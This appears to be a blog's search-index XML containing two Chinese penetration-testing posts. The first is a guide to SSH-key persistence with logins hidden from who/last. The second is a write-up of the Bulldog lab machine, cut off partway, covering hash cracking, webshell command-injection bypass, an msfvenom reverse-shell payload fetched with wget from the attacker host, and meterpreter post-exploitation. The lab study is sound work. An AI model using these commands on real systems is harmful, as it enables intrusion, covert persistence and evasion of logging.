<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>无密码SSH登录</title>
      <link href="2021/04/19/%E6%97%A0%E5%AF%86%E7%A0%81SSH%E7%99%BB%E5%BD%95/"/>
      <url>2021/04/19/%E6%97%A0%E5%AF%86%E7%A0%81SSH%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="无密码SSH登录"><a href="#无密码SSH登录" class="headerlink" title="无密码SSH登录"></a>无密码SSH登录</h1><p>用于反弹shell之后权限维持</p><p>##导出自己的ssh公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f zoukba</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> zoukba.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> zoukba.pub.</span><br></pre></td></tr></table></figure><p>会在当前路径下生成你的公钥</p><h2 id="读取密钥"><a href="#读取密钥" class="headerlink" title="读取密钥"></a>读取密钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat zoukba.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDN+cbSlui73UfXhg/5UI9Bwi4x+Eqy94GW5h9G7kQBqtPOYSyMk9Y6QRbF/XYMEuNVr92Q2PY8dttIF...[skip]...</span><br><span class="line">zuy5V6Ljp1u2hIO2vJTtAwWxdBa+HUZ0bwhK8EKRkYts7yPc7SZTHenDqx6pkA+7/fzSArHss5VvUjkSQtlJkKipziZLUPpQLngmUUCKDxCowmo/R3w/0Fq51SuCYgmn0Pd8l5Z5eAS7h1//crDX7EdBbkak/bwZvMpL6AhZNlVXqqhJDnThv9sjFcd8mcJs+Hdc7HHMZdmbgAI9qNa8nNhU= a0@Zoooooo.local</span><br></pre></td></tr></table></figure><h2 id="在远程主机的-ssh-目录写入authorized-keys"><a href="#在远程主机的-ssh-目录写入authorized-keys" class="headerlink" title="在远程主机的.ssh/ 目录写入authorized_keys"></a>在远程主机的<code>.ssh/</code> 目录写入<code>authorized_keys</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDN+cbSlui73UfXhg/5UI9Bwi4x+Eqy94GW5h9G7kQBqtPOYSyMk9Y6QRbF/XYMEuNVr92Q2PY8dttIF...[skip]...</span><br><span class="line">zuy5V6Ljp1u2hIO2vJTtAwWxdBa+HUZ0bwhK8EKRkYts7yPc7SZTHenDqx6pkA+7/fzSArHss5VvUjkSQtlJkKipziZLUPpQLngmUUCKDxCowmo/R3w/0Fq51SuCYgmn0Pd8l5Z5eAS7h1//crDX7EdBbkak/bwZvMpL6AhZNlVXqqhJDnThv9sjFcd8mcJs+Hdc7HHMZdmbgAI9qNa8nNhU= a0@Zoooooo.local &gt; authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="给予相应的权限"><a href="#给予相应的权限" class="headerlink" title="给予相应的权限"></a>给予相应的权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 auth*</span><br></pre></td></tr></table></figure><h2 id="实现无密码登录，权限维持"><a href="#实现无密码登录，权限维持" class="headerlink" title="实现无密码登录，权限维持"></a>实现无密码登录，权限维持</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -i zoukba root@172.20.10.7<span class="comment">#-i 跟着你的密钥文件名</span></span><br><span class="line">Last failed login: Mon Apr 19 21:25:24 CST 2021 on pts/0</span><br><span class="line">There was 1 failed login attempt since the last successful login.</span><br><span class="line">Last login: Mon Apr 19 21:25:00 2021</span><br><span class="line">[root@localhost ~]<span class="comment"># ls</span></span><br></pre></td></tr></table></figure><h2 id="登录痕迹"><a href="#登录痕迹" class="headerlink" title="登录痕迹"></a>登录痕迹</h2><h3 id="隐身登录系统，不会被w、who、last等指令检测到"><a href="#隐身登录系统，不会被w、who、last等指令检测到" class="headerlink" title="隐身登录系统，不会被w、who、last等指令检测到"></a>隐身登录系统，不会被w、who、last等指令检测到</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@192.168.0.1 /bin/bash -i zoukba</span><br></pre></td></tr></table></figure><h3 id="不记录ssh公钥在本地-ssh目录中"><a href="#不记录ssh公钥在本地-ssh目录中" class="headerlink" title="不记录ssh公钥在本地.ssh目录中"></a>不记录ssh公钥在本地.ssh目录中</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br></pre></td></tr></table></figure><h3 id="在远程主机上记得删除自己的密钥文件"><a href="#在远程主机上记得删除自己的密钥文件" class="headerlink" title="在远程主机上记得删除自己的密钥文件"></a>在远程主机上记得删除自己的密钥文件</h3>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux内网权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BullDog-writeup</title>
      <link href="2021/04/18/BullDog/"/>
      <url>2021/04/18/BullDog/</url>
      
        <content type="html"><![CDATA[<h1 id="BULLDOG"><a href="#BULLDOG" class="headerlink" title="BULLDOG"></a>BULLDOG</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 172.20.10.12</span><br><span class="line">Host is up (0.00076s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 20:8b:<span class="built_in">fc</span>:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)</span><br><span class="line">|   256 <span class="built_in">cd</span>:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)</span><br><span class="line">|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)</span><br><span class="line">80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><ul><li>可以看出靶机是个基于pythonweb框架的网站</li></ul><h2 id="路径扫描"><a href="#路径扫描" class="headerlink" title="路径扫描"></a>路径扫描</h2><h3 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[200][text/html; charset=utf-8][3.46kb] http://172.20.10.12/dev/</span><br><span class="line">[200][text/plain][1.05kb] http://172.20.10.12/robots.txt</span><br></pre></td></tr></table></figure><h3 id="DirBruster"><a href="#DirBruster" class="headerlink" title="DirBruster"></a>DirBruster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.20.10.12/admin/login/</span><br><span class="line">http://172.20.10.12/dev/shell/</span><br></pre></td></tr></table></figure><h2 id="网站内敏感信息搜集"><a href="#网站内敏感信息搜集" class="headerlink" title="网站内敏感信息搜集"></a>网站内敏感信息搜集</h2><h3 id="Content"><a href="#Content" class="headerlink" title="Content"></a>Content</h3><p><a href="http://172.20.10.12/dev/">http://172.20.10.12/dev/</a> 页面下得到hash值以及邮箱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Need these password hashes <span class="keyword">for</span> testing. Django<span class="string">&#x27;s default is too complex--&gt;</span></span><br><span class="line"><span class="string">&lt;!--We&#x27;</span>ll remove these <span class="keyword">in</span> prod. It<span class="string">&#x27;s not like a hacker can do anything with a hash--&gt;</span></span><br><span class="line"><span class="string">Team Lead: alan@bulldogindustries.com&lt;br&gt;&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;</span></span><br><span class="line"><span class="string">Back-up Team Lead: william@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;</span></span><br><span class="line"><span class="string">Front End: malik@bulldogindustries.com&lt;br&gt;&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;</span></span><br><span class="line"><span class="string">Front End: kevin@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;</span></span><br><span class="line"><span class="string">Back End: ashley@bulldogindustries.com&lt;br&gt;&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;</span></span><br><span class="line"><span class="string">Back End: nick@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;</span></span><br><span class="line"><span class="string">Database: sarah@bulldogindustries.com&lt;br&gt;&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p><a href="http://172.20.10.12/dev/shell/">http://172.20.10.12/dev/shell/</a></p><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418222235.png"></p><ul><li>提示要使用网站管理员的凭据，才能使用此Webshell页面</li></ul><h2 id="Hash爆破进入后台"><a href="#Hash爆破进入后台" class="headerlink" title="Hash爆破进入后台"></a>Hash爆破进入后台</h2><h3 id="John爆破猜解Hash值"><a href="#John爆破猜解Hash值" class="headerlink" title="John爆破猜解Hash值"></a>John爆破猜解Hash值</h3><ul><li><p>hash.txt</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    6515229daf8dbdc8b89fed2e60f107433da5f2cb</span><br><span class="line">38882f3b81f8f2bc47d9f3119155b05f954892fb</span><br><span class="line">c6f7e34d5d08ba4a40dd5627508ccb55b425e279</span><br><span class="line">0e6ae9fe8af1cd4192865ac97ebf6bda414218a9</span><br><span class="line">553d917a396414ab99785694afd51df3a8a8a3e0</span><br><span class="line">ddf45997a7e18a25ad5f5cf222da64814dd060d5</span><br><span class="line">d8b8dd5e7f000b8dea26ef8428caf38c04466b3e</span><br></pre></td></tr></table></figure></li><li><p>使用john爆破出密码</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;raw-sha1 hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 7 password hashes with no different salts (Raw-SHA1 [SHA1 256&#x2F;256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support for this hash type, consider --fork&#x3D;2</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">bulldog          (?)</span><br><span class="line">bulldoglover     (?)</span><br><span class="line">Warning: Only 5 candidates left, minimum 8 needed for performance.</span><br><span class="line">2g 0:00:00:01 DONE (2021-04-18 13:11) 1.562g&#x2F;s 11205Kp&#x2F;s 11205Kc&#x2F;s 63376KC&#x2F;s ▒xCvBnM,..*7¡Vamos!</span><br><span class="line">Use the &quot;--show --format&#x3D;Raw-SHA1&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">由于我这里没有给出用户名，所以我还是需要Burp抓包爆破一下</span><br><span class="line"></span><br><span class="line">+ 使用Burp基于所给出的密码以及账号（我是用过邮箱猜解的）</span><br><span class="line"></span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418222809.png)</span><br><span class="line">    </span><br><span class="line">+ 得到账号nike和sarah</span><br><span class="line"></span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223044.png)</span><br><span class="line">    </span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223112.png)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">## 利用之前的Webshell页面进行进一步渗透</span><br><span class="line"></span><br><span class="line">### 查看Webshell页面</span><br><span class="line"></span><br><span class="line">![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223147.png)</span><br><span class="line"></span><br><span class="line">得到了命令执行界面，这里的逻辑是只能使用给出的命令</span><br><span class="line"></span><br><span class="line">+ 测试使用&#96;&#96;&#96;|,&amp;&#96;&#96;&#96;可以绕过限制；我使用的是&#96;&#96;&#96; | &#96;&#96;&#96;他会执行后面的命令，命令限制只匹配第一个输入，所以我在后面构造语句</span><br><span class="line"></span><br><span class="line">    ![](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zoukba0014&#x2F;imagehost&#x2F;img&#x2F;20210418223407.png)</span><br><span class="line">    </span><br><span class="line">+ 存在python环境</span><br><span class="line"></span><br><span class="line">    &#96;&#96;&#96;bash</span><br><span class="line">    Command : ls | python -h</span><br><span class="line">usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...</span><br><span class="line">Options and arguments (and corresponding environment variables):</span><br><span class="line">-B     : don&#39;t write .py[co] files on import; also PYTHONDONTWRITEBYTECODE&#x3D;x</span><br><span class="line">-c cmd : program passed in as string (terminates option list)</span><br><span class="line">-d     : debug output from parser; also PYTHONDEBUG&#x3D;x</span><br><span class="line">-E     : ignore PYTHON* environment variables (such as PYTHONPATH)</span><br><span class="line">-h     : print this help message and exit (also --help)</span><br><span class="line">-i     : inspect interactively after running script; forces a prompt even</span><br><span class="line">         if stdin does not appear to be a terminal; also PYTHONINSPECT&#x3D;x</span><br><span class="line">-m mod : run library module as a script (terminates option list)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>存在perl环境</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Command : ls | perl -v</span><br><span class="line">This is perl 5, version 22, subversion 1 (v5.22.1) built <span class="keyword">for</span> x86_64-linux-gnu-thread-multi</span><br><span class="line">(with 58 registered patches, see perl -V <span class="keyword">for</span> more detail)</span><br><span class="line"></span><br><span class="line">Copyright 1987-2015, Larry Wall</span><br><span class="line"></span><br><span class="line">Perl may be copied only under the terms of either the Artistic License or the</span><br><span class="line">GNU General Public License, <span class="built_in">which</span> may be found <span class="keyword">in</span> the Perl 5 <span class="built_in">source</span> kit.</span><br><span class="line"></span><br><span class="line">Complete documentation <span class="keyword">for</span> Perl, including FAQ lists, should be found on</span><br><span class="line">this system using <span class="string">&quot;man perl&quot;</span> or <span class="string">&quot;perldoc perl&quot;</span>.  If you have access to the</span><br><span class="line">Internet, point your browser at http://www.perl.org/, the Perl Home Page.</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用python结合msf进行回弹（其实在这样的靶机下nc足够了）"><a href="#使用python结合msf进行回弹（其实在这样的靶机下nc足够了）" class="headerlink" title="使用python结合msf进行回弹（其实在这样的靶机下nc足够了）"></a>使用python结合msf进行回弹（其实在这样的靶机下nc足够了）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=4444 -f raw -o /Users/a0/www/payload.py</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload</span><br><span class="line">[-] No arch selected, selecting arch: python from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 493 bytes</span><br><span class="line">Saved as: /Users/a0/www/payload.py</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; python/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  172.20.10.2      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit   </span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>使用python搭建服务器，一会用目标机去下载（生成的payload文件要放在www下）    </p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    python3 -m http.server 9900</span><br><span class="line">Serving HTTP on :: port 9900 (http://[::]:9900/) ...</span><br><span class="line">    </span><br></pre></td></tr></table></figure></li><li><p>构造语句执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    ls | wget http://172.20.10.2:9900/payload.py</span><br><span class="line">ls | python payload.py</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>回弹得到shell</p><p>  <img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418224319.png"></p></li></ul><h2 id="linux内的信息搜集"><a href="#linux内的信息搜集" class="headerlink" title="linux内的信息搜集"></a>linux内的信息搜集</h2><ul><li><p>sysinfo</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    meterpreter &gt; sysinfo</span><br><span class="line">Computer        : bulldog</span><br><span class="line">OS              : Linux 4.4.0-87-generic <span class="comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017</span></span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Meterpreter     : python/linux</span><br></pre></td></tr></table></figure></li><li><p>ps</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    926    1     snapd              root              /usr/lib/snapd/snapd</span><br><span class="line">943    919   CRON               root              /usr/sbin/CRON -f</span><br><span class="line">960    1     polkitd            root              /usr/lib/policykit-1/polkitd --no-debug</span><br><span class="line">962    1     mdadm              root              /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog</span><br><span class="line">968    943   sh                 root              /bin/sh -c <span class="built_in">cd</span> /home/django/bulldog &amp;&amp; sudo -u django python /home/django/bulldog/manage.py runserver 0.0.0.0:8080 --insecure</span><br><span class="line">973    968   sudo               root              sudo -u django python /home/django/bulldog/manage.py runserver 0.0.0.0:8080 --insecure</span><br><span class="line">976    973   python             django            python /home/django/bulldog/manage.py runserver 0.0.0.0:8080 --insecure</span><br><span class="line">982    2     [ttm_swap]         root</span><br><span class="line">1042   1     sshd               root              /usr/sbin/sshd -D </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>ls</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">Listing: /home/django/bulldog</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">40775/rwxrwxr-x   4096   dir   2017-08-25 07:23:25 +0800  bulldog</span><br><span class="line">100757/rwxr-xrwx  41984  fil   2021-04-18 13:26:47 +0800  db.sqlite3</span><br><span class="line">100755/rwxr-xr-x  250    fil   2017-08-25 07:22:04 +0800  manage.py</span><br><span class="line">100644/rw-r--r--  250    fil   2021-04-18 14:10:25 +0800  payload.elf</span><br><span class="line">100644/rw-r--r--  493    fil   2021-04-18 14:26:56 +0800  payload.py</span><br><span class="line">100644/rw-r--r--  493    fil   2021-04-18 14:27:08 +0800  payload.py.1</span><br></pre></td></tr></table></figure><p>   由此我发现managy.py文件启动这个web服务；且在bulldog文件下存在一个数据库文件db.sqlite3</p></li></ul><h2 id="查看db-sqlite3-拿到administrator用户"><a href="#查看db-sqlite3-拿到administrator用户" class="headerlink" title="查看db.sqlite3 拿到administrator用户"></a>查看db.sqlite3 拿到administrator用户</h2><h3 id="将db-sqlite3下载到本地"><a href="#将db-sqlite3下载到本地" class="headerlink" title="将db.sqlite3下载到本地"></a>将db.sqlite3下载到本地</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download db.sqlite3 /Users/a0/Desktop/BullDog</span><br></pre></td></tr></table></figure><h3 id="在使用Navicat-Premium查看"><a href="#在使用Navicat-Premium查看" class="headerlink" title="在使用Navicat Premium查看"></a>在使用Navicat Premium查看</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418225951.png"></p><p>使用sha254基本就凉凉了，我将知道账号密码的nick、以及sarah的权限提到了superuser（后期来看没有什么用，当时一心想要换个shell，总感觉python不靠谱。其实当时已经可以执行命令了，直接上个elf就得了！！！）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload /Users/a0/Desktop/BullDog/db.sqlite3</span><br><span class="line"><span class="comment">#上传覆盖掉原来的数据库文件</span></span><br><span class="line">python manege.py serverstart</span><br><span class="line"><span class="comment">#重新运行服务器脚本启动</span></span><br></pre></td></tr></table></figure><h3 id="上后台一无所获，索然无味"><a href="#上后台一无所获，索然无味" class="headerlink" title="上后台一无所获，索然无味"></a>上后台一无所获，索然无味</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210418230351.png"></p><p>其实换个思路来说，网站后台到了administrator权限</p><h2 id="使用各种CVE提权（这里均失败了，我就不提了）"><a href="#使用各种CVE提权（这里均失败了，我就不提了）" class="headerlink" title="使用各种CVE提权（这里均失败了，我就不提了）"></a>使用各种CVE提权（这里均失败了，我就不提了）</h2><ul><li>使用sudo提权–CVE-2021-3156</li><li>脏牛提权–CVE-2016-5195</li></ul><h3 id="最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）"><a href="#最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）" class="headerlink" title="最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）"></a>最终失败是因为这个靶机就没有装gcc环境（属于前期信息搜集的失败！浪费我一个下午）</h3><ul><li><p>贴一条查看环境命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env<span class="comment">#查看环境</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span><span class="comment">#查看路径</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h2><h3 id="巧合"><a href="#巧合" class="headerlink" title="巧合"></a>巧合</h3><p>我在做搜集的时候一直是在网站目录下；直到我发现了一个bulldogadmin，在这个文件中发现了.hiddenadmindirectory，好家伙！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/django</span><br><span class="line">$ <span class="built_in">cd</span> ../.</span><br><span class="line">$ ls -a</span><br><span class="line">.  ..  bulldogadmin  django</span><br><span class="line">$ <span class="built_in">cd</span> bulldogadmin</span><br><span class="line">$ ls -a</span><br><span class="line">.      .cache     .selected_editor</span><br><span class="line">..      .hiddenadmindirectory  .sudo_as_admin_successful</span><br><span class="line">.bash_logout  .nano     .wget-hsts</span><br><span class="line">.bashrc       .profile</span><br><span class="line">$ <span class="built_in">cd</span> .hiddenadmindirectory</span><br><span class="line">$ ls</span><br><span 